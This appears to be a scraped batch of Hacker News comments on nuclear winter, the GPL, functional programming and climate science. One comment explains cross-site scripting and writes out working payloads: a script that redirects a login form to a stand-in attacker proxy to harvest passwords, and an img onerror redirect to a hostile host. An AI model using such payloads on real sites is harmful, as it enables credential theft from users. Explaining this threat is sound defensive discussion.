1154384,comment,1154068,1154105,0,0,ebishop,,,"This is very true, but contrary to what most people think the real danger isn't nuclear fallout but nuclear winter.  Nuclear blasts kick up a lot of dust into the atmosphere, and even a few blasts can drastically alter the climate.  A study a few years ago found that a nuclear war in which only 50 Hiroshima sized bombs were detonated could wreak havoc. See the wikipedia article on this topic: <a href=""http://en.wikipedia.org/wiki/Nuclear_winter"" rel=""nofollow"">http://en.wikipedia.org/wiki/Nuclear_winter</a><p>The danger of nuclear winter has actually become worse, and it is not dependent on the size of the bombs.  The problem is that urban areas are becoming more and more densely built up, and petroleum products (e.g. plastics) are more frequently being used as building materials.  You don't need a truly huge bomb -- just one big enough to set fire to everything, so that it can't be extinguished.  The energy released from burning all the plastic and wood and other flammable materials found in a modern city can be even greater than the bomb itself.  Further, when plastic burns, it's very dirty, and all that smoke gets carried far into the atmosphere.  It's the dust and debris and smoke that gets thrown into the upper atmosphere that does the real damage, blocking the sun and changing the climate.",1267224982

Each note was represented by a little yellow or magenta stripe painted on the inside of the tunnel, based on which ""part"" (i.e. hand) was playing it. The angular position was determined by the pitch (which wrapped around at each octave), and the length of the stripe was determined by the duration of the note.

This can include programmers.<p>But to spell it out for you: Cross-site scripting includes as a vector the ability to cause a person to click on a hostile link and cause the resulting page to do something nasty and unexpected. Suppose I post a link in a forum that contains ""?username=jerf'><script>document.forms[0].action=""htt://hostileproxy.com/userscrape;something_to_hide_login_error()</script><span x='"" and tell someone they have to log in. (I changed http to htt to bypass HN linkification.) Now their login goes to my proxy instead, which transparently steals the username and password, and bounces them back to the original site, leaving the user oblivious.<p>That's why I mentioned it used GET and not POST; it's somewhat harder to fake up a post in a forum (though it's not impossible, I've done it), but faking a ""GET"" is just a matter of typing the link in. Even if the forum displays the entire link, some people will click. Not everybody is a programmer.<p>As for whether this is a real threat, don't even <i>try</i> to tell me this isn't, because I've <i>done</i> this. I didn't steal any logins or do anything nasty, but I definitely got far enough to do it if I wanted to. (In fact, same problem: I tried to report it, and the site owner didn't believe it was a really-exploitable problem, either. Yeah... it was.) I don't even say this like it's a point of pride because it was like taking candy from a baby. Just start sticking ', "", and in the case of textareas, </textarea> in places they don't belong and you too will rapidly join the ranks of leet hacker.<p>(For double-bonus points, it is sometimes possible to create HTML content that will automatically fire Javascript off in a forum; try something like <img src=""does.not.exist.jpg"" onerror=""window.location='htt://hostile.com'"">, just as one for-instance. Now, use a browser vuln to load your choice of spyware onto the user's machine.

1154361,comment,1148079,1152842,0,0,chrischen,,,"I think you took my comparison too concretely.<p>Communism is about as similar to the GPL as it is to pro-lifers. Nothing more, and I did not mean to imply any more similarity than that.<p>To help you grab on to my extended metaphor:<p>Communism: a communist controlled authoritarian country => GPL: the subset of _released_ software licensed under the GPL<p>Communism: your natural free will and ability to make a choice => GPL: Your guaranteed rights (in free world) to intellectual property<p>Communism: everyone's forced to be selfless (fair redistribution of wealth)... under penalty of death? => GPL: everyone's forced to license under GPL under penalty of being sued<p>Communism: if not forced, one person could shift the economy because communism != economic equilibrium => GPL: If GPL does not force GPL on derivatives, then one proprietary software could shift the balance of power so that it's more advantageous not to open source. This is because if on guy doesn't share, he expends less resources on helping others, while taking in fruits of others' labors.<p>Public domain is like a family, or really small communal group, whereas GPL is like some authoritarian communist state. You've got the family which works well on the ideal of dedication to the whole. It's small, but it's all by free choice. You've got communist China supposedly trying to force this ideal of a harmonious multi-billion member family on its people, while probably never going to achieve it. Sure they're converting more people to <i>communism</i>, but at what cost?<p>There is no absolute <i>force</i>. There is always at least 2 distinct choices, and any ""forcing"" as we know it is a result of external pressure. The GPL exerts an external pressure on decisions, so for all intents and purposes, it <i>forces</i>, thus limiting true freedom. True freedom is when there are no external pressures on a decision.<p>Communism (in practice): In order to propagate and preserve itself it needs to be forced upon people because the slightest selfish act topples the whole system. This is opposed to letting everyone <i>choose</i> to be selfless (not bloody likely, which is why force is necessary).\nGPL: In order to propagate and preserve itself it needs to enforce its doctrine by law whether or not it makes practical sense in individual cases. This is opposed to letting everyone choose when it's appropriate and practical to open source, and when to proprieties (like in Communism, it can be disadvantageous for all if only a few keep their software proprietary). However I do concede that since the GPL does not force you to release the changes it is one good thing about it.\nPro-lifers (in practice): In order to propagate life and preserve the sanctity of it, it is necessary to force people to do the morally right thing, whether or not it's practical in each individual case.<p>Common themes: absolute black and white world view; end justifying means; restricting free choice\nIt's particularly hypocritical of the GPL, which espouses freedom, to achieve it's goal through restriction of freedom.\nHey sure if we are all nice selfless people we could live in a global commune. If we are all righteous, we wouldn't need to be forced not to kill (or make) babies we don't want. And if we all understood the benefits of free software, we wouldn't need to be forced. But we aren't Jesus, aren't righteous, and aren't smart enough to appreciate free software. Therefore it's unfair to encourage anything that forces people to pretend the world is ideal.<p>------------------------<p>>Now, can you name one ideal which is compatible with our world? Even slavery isn't completely abolished. I mean, any political idea will have its opponents.<p>Your question is an oxymoron. By definition anything ideal is unattainable, and as for the purposes of our discussion, it means it's also not compatible with our world. But I don't know why you are treating me like I'm Microsoft, I love free software. I've learned all I know from free software and it's let me build some wonderful things. But I love free software for freedom. And the GPL is not free. It's trying to make the world free, but by utilizing the very restriction on software freedoms it's trying to abolish. Hey if free software is really good for everyone, why not let it propagate by its own merits, rather than artificial restrictions/terms? I for one have faith in the practical benefits of free software, and don't believe it's necessary to force (if you want to benefit from GPL) people to adopt it.<p>> If your conclusion is that a software licence shouldn't embody political ideas, take a look at proprietary software licences. \nNot my conclusion at all, I think free-er licenses are just as political.<p>> Restrictions like ""thou shalt not study this software"" are indeed quite political.\nAnd what's the difference between ""thou shalt not study this software"" and ""thou must make any changes public upon distribution""? They both restrict your rights. And the only time the GPL's restriction wouldn't matter is if the whole world's softwares were under GPL. But that ain't happening any time soon, and sure as hell ain't going to happen if I'm forced to do it.<p>> It was specifically designed with our current world in mind, to make it go from proprietary software to free software, progressively.\nYes progressively by force... by constantly limiting our choices until one day we've got none but GPL (or do everything yourself).<p>>Remember: the political agenda behind the GPL is freedom.\nThe whole idea of freedom is to have freedom in means, not just the ends. Plus, being an ideal, that end will never be achieved, which means all we've got are the means. So if the means aren't free, we'll never be free. So given that the GPL restricts our rights to try to achieve a probably unattainable ideal, we'll probably be stuck having our rights restricted until the end of world.<p>> You can't, however, oppose the GPL without being in the camp of proprietary software, at least to some extent.\nThat's like saying you can't be pro-choice without being at least a little pro-death (which is not true btw). Like I said before, I want all software to be free, but I'm not going to waste my time <i>restricting</i> rights while trying to achieve that goal.",1267224440

This has been one of my main gripes with my experiments with functional languages.  It seems they are always showing you this beautiful elegant code, and then explaining how if you want it to be efficient, you need to use a different, much uglier, approach.<p>Of course, the other thing with this is the example is completely unrealistic.  If you actually wanted to compute that number, the fast way to do it is to use the good old formula<p><pre><code>    (N * (N-1))/2\n</code></pre>\nIf for some reason you wanted to compute that sort of thing a lot, to would make a lot more sense to make a simple function to calculate that...",1267222357

And that's with varying degrees of precision.<p>It's interesting to note that there was a huge gap in time between observing the weather and recording it. There was a further gap before we started predicting the weather. For most of that time, people substituted superstitions about the weather for science. The sky gods were happy, the sun came out. The sky gods were unhappy, it rained. If we would only do the right thing, the sky gods would remain happy. If we want the weather to be agreeable, we must change our behavior.<p>With the worldwide climate, we are only about 20-50 years into simply observing and recording. It could be quite a long while indeed before global long-term climate predictions is anything at all like the 3-day local weather forecast.<p>Remember, three stages: abduction, deduction, and induction. Abduction: gathering data and spotting patterns. Deduction: taking patterns and positing relationships. Induction: taking those relationships and extrapolating to future behavior of the system.<p>Climate science is currently mostly abduction. But folks like to describe it in terms of induction because lots of pieces of the underlying physics <i>are</i> at that stage. But it doesn't work that way.<p>I don't know if that strikes you as some kind of big hand-waving philosophy bullshit, but it's just the way things are, whether I point it out or not.
